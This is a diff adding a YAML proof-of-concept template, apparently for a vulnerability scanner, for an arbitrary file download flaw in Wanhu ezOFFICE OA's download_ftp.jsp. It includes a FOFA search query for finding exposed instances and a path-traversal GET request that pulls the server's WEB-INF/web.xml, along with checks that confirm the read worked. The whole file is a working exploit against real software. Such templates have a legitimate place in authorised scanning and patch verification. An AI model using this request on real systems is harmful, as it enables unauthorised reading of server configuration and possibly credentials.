@@ -1,0 +1,22 @@
+id: poc-yaml-whir-oa-download-ftp-jsp-anyfile-upload
+info:
+  name: 万户OA download_ftp.jsp 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 万户ezOFFICE协同管理平台
+  fofa: app="ezOFFICE协同管理平台"
+requests:
+- method: GET
+  path: /defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
+  expression: 'status_code == 200 &&
+
+    contains(body,"<display-name>defaultroot</display-name>") &&
+
+    contains(body,"<servlet-name>") &&
+
+    contains(headers,"text/xml")
+
+    '
+variables: {}
+transport: http
